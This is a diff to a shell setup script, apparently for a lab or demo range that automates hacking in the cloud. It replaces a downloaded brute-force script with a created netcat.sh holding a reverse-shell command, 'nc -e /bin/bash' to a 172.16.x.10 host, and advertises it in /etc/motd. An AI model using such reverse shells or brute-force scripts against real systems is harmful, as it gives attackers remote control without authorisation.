@@ -63,7 +63,7 @@ sudo wget https://raw.githubusercontent.com/jamesholland-uk/auto-hack-cloud/mast
 su -c "./shellinaboxd -b -q -t --user-css Normal:+shell-style.css" -s /bin/sh user
 #
 sudo touch /home/user/.bashrc
-sudo echo -e "\n\n+ -- --=[ Pre-canned ]=-- -- +\n\n    ./brute-force.sh\n\n" >> /etc/motd
-sudo wget https://raw.githubusercontent.com/jamesholland-uk/auto-hack-cloud/master/brute-force.sh
-sudo chmod 755 brute-force.sh
-sed -i "s/xxyyzz/$1/g" brute-force.sh
+sudo echo -e "\n\n+ -- --=[ Pre-canned ]=-- -- +\n\n    ./netcat.sh\n\n" >> /etc/motd
+sudo touch netcat.sh
+sudo echo "nc.traditional -e /bin/bash 172.16.$1.10 80" > netcat.sh
+sudo chmod 755 netcat.sh
